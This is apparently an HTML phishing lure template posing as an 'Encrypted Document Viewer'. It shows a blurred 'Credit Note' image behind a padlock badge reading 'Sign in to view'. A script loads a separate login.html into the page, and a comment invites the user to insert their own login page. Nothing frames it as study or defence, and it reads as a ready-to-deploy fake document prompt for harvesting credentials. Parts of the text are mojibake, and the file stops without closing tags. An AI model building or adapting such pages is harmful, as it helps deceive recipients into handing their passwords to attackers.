<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Encrypted File â€” Viewer</title>
  <style>
    :root {
      --bg: #f4f6f8;
      --card: #ffffff;
      --muted: #6b7280;
    }
    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;background:var(--bg);color:#111;}
    /* --- Blur overlay --- */
    .blur-overlay {
      position: fixed;
      inset: 0;
      background: url('https://i.ibb.co/jvBRfLqJ/Credit-Note-CECN2501001.jpg') center/cover no-repeat;
      filter: blur(8px);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
      z-index: 9999;
      opacity: 0;
      animation: fadeInOverlay 1s ease forwards;
      transition: opacity .8s ease, transform .8s ease;
      text-align: center;
    }
    .blur-overlay.fade-out { opacity: 0; transform: translateY(-30px); pointer-events: none; }
    .blur-overlay .badge {
      background: rgba(0,0,0,0.6);
      padding: 18px 36px;
      border-radius: 12px;
      display: inline-block;
      line-height:1.2;
    }
    .blur-overlay .badge .title { display:block; font-size:24px; color:#ffefef; margin-bottom:6px; }
    .blur-overlay .badge .subtitle { display:block; font-size:14px; color: #ffecec; opacity:0.9; font-weight:500; }
    @keyframes fadeInOverlay { 0% { opacity:0; transform:scale(1.02);} 100% { opacity:1; transform:scale(1);} }

    /* --- Page shell --- */
    .page {
      max-width: 980px;
      margin: 48px auto;
      padding: 24px;
    }

    header.site-head {
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:18px;
    }
    header.site-head img { width:56px; height:56px; border-radius:8px; object-fit:cover; }
    header.site-head h1 { margin:0; font-size:18px; color:#0f172a; }
    .placeholder {
      background: var(--card);
      border-radius:10px;
      padding:28px;
      box-shadow: 0 6px 18px rgba(16,24,40,0.06);
      min-height:260px;
      display:flex;
      align-items:center;
      justify-content:center;
      color:var(--muted);
    }

    /* content area hidden until overlay dismissed */
    #content { opacity:0; transform: translateY(40px); transition: all .6s ease; }
    #content.visible { opacity:1; transform: translateY(0); }

    footer { margin-top:20px; color:var(--muted); font-size:13px; text-align:center; }
    @media (max-width:720px) {
      .blur-overlay .badge { padding:14px 20px; }
      .blur-overlay .badge .title { font-size:20px; }
    }
  </style>
</head>
<body>

  <!-- Blur overlay (click to reveal content) -->
  <div class="blur-overlay" id="overlay" role="button" aria-label="Click to view file">
    <div class="badge" aria-hidden="true">
      <span class="title">ðŸ”’ Encrypted File</span>
      <span class="subtitle">Sign in to view</span>
    </div>
  </div>

  <audio id="unlockSound" preload="auto">
    <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_9b09f1c5a3.mp3" type="audio/mpeg">
  </audio>

  <!-- Main page shell -->
  <div class="page" role="main">
    <header class="site-head" aria-hidden="true">
      <img src="https://i.ibb.co/xtsKw4XN/Screenshot-2025-05-17-at-12-48-58.png" alt="Logo">
      <div>
        <h1>Encrypted Document Viewer</h1>
        <div style="color:var(--muted);font-size:13px;">This file is secured â€” sign in to view the contents.</div>
      </div>
    </header>

    <!-- Placeholder / content container
         Put your own login page or embed here (replace the placeholder below) -->
    <div id="content"></div>

<script>
  fetch("login.html")
    .then(response => response.text())
    .then(data => {
      document.getElementById("content").innerHTML = data;
    });
</script>
